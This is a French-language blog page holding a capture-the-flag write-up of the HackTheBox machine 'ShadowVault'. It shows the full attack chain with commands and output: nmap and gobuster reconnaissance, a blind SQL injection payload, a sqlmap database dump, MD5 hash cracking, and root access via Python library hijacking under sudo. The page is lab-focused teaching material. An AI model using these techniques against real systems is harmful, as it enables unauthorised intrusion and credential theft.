<!DOCTYPE html>
<html lang="fr" data-theme="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Writeup HTB : ShadowVault ‚Äî CyberFolio</title>
  <meta name="description" content="R√©solution compl√®te du challenge HackTheBox ShadowVault. Blind SQLi, extraction de base, privesc via sudo.">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üõ°Ô∏è</text></svg>">
  <link rel="stylesheet" href="css/style.css">
  <style>.reading-progress-bar{position:fixed;top:var(--nav-height);left:0;height:3px;z-index:1001;background:var(--accent);transition:width 0.1s linear;}</style>
</head>
<body>
  <div class="reading-progress-bar reading-progress" style="width:0%"></div>
  <nav class="nav"><div class="nav-inner"><a href="index.html" class="nav-logo"><span class="logo-icon">CF</span>CyberFolio</a><ul class="nav-links"><li><a href="index.html">Accueil</a></li><li><a href="blog.html" class="active">Blog</a></li><li><a href="projects.html">Projets</a></li><li><a href="about.html">√Ä propos</a></li><li><a href="contact.html">Contact</a></li></ul><div style="display:flex;align-items:center;gap:0.75rem;"><button class="theme-toggle" aria-label="Toggle theme">üåô</button><button class="nav-burger" aria-label="Menu"><span></span><span></span><span></span></button></div></div></nav>
  <div class="mobile-menu"><a href="index.html">Accueil</a><a href="blog.html">Blog</a><a href="projects.html">Projets</a><a href="about.html">√Ä propos</a><a href="contact.html">Contact</a></div>

  <section class="article-hero container">
    <span class="card-tag tag-ctf">CTF Writeup</span>
    <h1>Writeup HTB : Exploitation d'une injection SQL aveugle sur "ShadowVault"</h1>
    <div class="article-meta">
      <span>üìÖ 1 F√©vrier 2026</span>
      <span>‚è±Ô∏è 10 min de lecture</span>
      <span>‚úçÔ∏è CyberFolio</span>
    </div>
  </section>

  <article class="article-content">
    <div class="toc">
      <h4>Sommaire</h4>
      <ul>
        <li><a href="#overview">Vue d'ensemble</a></li>
        <li><a href="#recon">1. Reconnaissance</a></li>
        <li><a href="#sqli">2. Injection SQL aveugle</a></li>
        <li><a href="#shell">3. Obtention d'un shell</a></li>
        <li><a href="#privesc">4. √âl√©vation de privil√®ges</a></li>
        <li><a href="#flags">5. Flags</a></li>
      </ul>
    </div>

    <h2 id="overview">Vue d'ensemble</h2>
    <pre><code># Machine : ShadowVault
# Plateforme : HackTheBox
# Difficult√© : Medium
# OS : Linux (Ubuntu 22.04)
# IP : 10.10.11.42
# Techniques : Blind SQLi, SSH, Sudo privesc</code></pre>

    <h2 id="recon">1. Reconnaissance</h2>
    <p>On commence par un scan Nmap classique :</p>
    <pre><code>nmap -sC -sV -oN nmap/initial 10.10.11.42

# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.9p1
# 80/tcp   open  http    Apache/2.4.52
# 3306/tcp open  mysql   MySQL 8.0.32 (filtered)</code></pre>

    <p>Le port 80 h√©berge une application web avec un formulaire de connexion √† <code>/login</code> et une fonctionnalit√© de recherche √† <code>/search</code>.</p>

    <pre><code># Fuzzing des r√©pertoires
gobuster dir -u http://10.10.11.42 -w /usr/share/wordlists/dirb/big.txt

# /login  (200)  |  /search (200)  |  /admin (302)  |  /api (200)</code></pre>

    <h2 id="sqli">2. Injection SQL aveugle</h2>
    <p>Le param√®tre de recherche est vuln√©rable √† une injection SQL aveugle (boolean-based) :</p>
    <pre><code># Test
GET /search?q=test' AND 1=1-- -   ‚Üí R√©sultats normaux
GET /search?q=test' AND 1=2-- -   ‚Üí Aucun r√©sultat
# ‚Üí Confirm√© : Blind SQLi !

# Extraction avec sqlmap
sqlmap -u "http://10.10.11.42/search?q=test" --dbs --batch
# available databases:
# [*] information_schema
# [*] shadowvault
# [*] mysql

sqlmap -u "http://10.10.11.42/search?q=test" -D shadowvault --tables --batch
# +----------+
# | users    |
# | secrets  |
# | sessions |
# +----------+

sqlmap -u "http://10.10.11.42/search?q=test" -D shadowvault -T users --dump --batch
# +----+----------+----------------------------------+
# | id | username | password                         |
# +----+----------+----------------------------------+
# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
# | 2  | shadow   | 482c811da5d5b4bc6d497ffa98491e38 |
# +----+----------+----------------------------------+</code></pre>

    <p>On cracke le hash MD5 de l'utilisateur "shadow" :</p>
    <pre><code># hashcat ou CrackStation
echo "482c811da5d5b4bc6d497ffa98491e38" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# ‚Üí password123</code></pre>

    <h2 id="shell">3. Obtention d'un shell</h2>
    <p>Le mot de passe est r√©utilis√© pour SSH :</p>
    <pre><code>ssh shadow@10.10.11.42
# Password: password123
# ‚Üí Connect√© !

shadow@shadowvault:~$ id
uid=1001(shadow) gid=1001(shadow) groups=1001(shadow)

shadow@shadowvault:~$ cat user.txt
# HTB{bl1nd_sql1_f0r_th3_w1n_****}</code></pre>

    <h2 id="privesc">4. √âl√©vation de privil√®ges</h2>
    <p>On cherche les permissions sudo :</p>
    <pre><code>shadow@shadowvault:~$ sudo -l
# User shadow may run the following commands:
#     (root) NOPASSWD: /usr/bin/python3 /opt/backup.py

# Examinons le script
shadow@shadowvault:~$ cat /opt/backup.py
import zipfile
import os

def backup():
    with zipfile.ZipFile('/tmp/backup.zip', 'w') as z:
        for f in os.listdir('/var/www/html'):
            z.write(f'/var/www/html/{f}')

backup()

# Le script importe zipfile ‚Äî on peut faire un Python library hijacking !
shadow@shadowvault:~$ echo 'import os; os.system("/bin/bash")' > /tmp/zipfile.py
shadow@shadowvault:~$ cd /tmp
shadow@shadowvault:/tmp$ sudo /usr/bin/python3 /opt/backup.py

root@shadowvault:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

root@shadowvault:/tmp# cat /root/root.txt
# HTB{pyth0n_l1br4ry_h1j4ck_****}</code></pre>

    <h2 id="flags">5. R√©capitulatif</h2>
    <p>Les deux flags ont √©t√© r√©cup√©r√©s gr√¢ce √† une cha√Æne d'exploitation en trois √©tapes : l'injection SQL aveugle a permis d'extraire des credentials, la r√©utilisation de mot de passe a donn√© un acc√®s SSH, et le d√©tournement de biblioth√®que Python via sudo a permis l'√©l√©vation de privil√®ges.</p>

    <p>Vuln√©rabilit√©s exploit√©es :</p>
    <ul>
      <li><strong>Blind SQL Injection</strong> ‚Äî Pas de validation des entr√©es utilisateur</li>
      <li><strong>Mots de passe faibles + MD5</strong> ‚Äî Hashage obsol√®te, mot de passe trivial</li>
      <li><strong>R√©utilisation de credentials</strong> ‚Äî M√™me mot de passe pour l'app web et SSH</li>
      <li><strong>Python Library Hijacking</strong> ‚Äî Script sudo dans un r√©pertoire writable</li>
    </ul>

    <blockquote>
      üéØ <strong>Le√ßon</strong> : Toujours v√©rifier le PYTHONPATH et les permissions des r√©pertoires quand un script Python est ex√©cut√© avec sudo. Et utilisez des algorithmes de hashage modernes (bcrypt, argon2).
    </blockquote>

    <div style="margin-top:4rem;padding-top:2rem;border-top:1px solid var(--border);text-align:center;">
      <a href="blog.html" class="btn btn-secondary">‚Üê Retour au blog</a>
    </div>
  </article>

  <footer class="footer"><div class="container footer-inner"><span class="footer-text">¬© 2026 CyberFolio. Construit avec passion et caf√© ‚òï</span><div class="footer-links"><a href="https://github.com/username" target="_blank" rel="noopener">GitHub</a><a href="https://twitter.com/username" target="_blank" rel="noopener">Twitter</a><a href="https://linkedin.com/in/username" target="_blank" rel="noopener">LinkedIn</a></div></div></footer>
  <script src="js/main.js"></script>
</body>
</html>
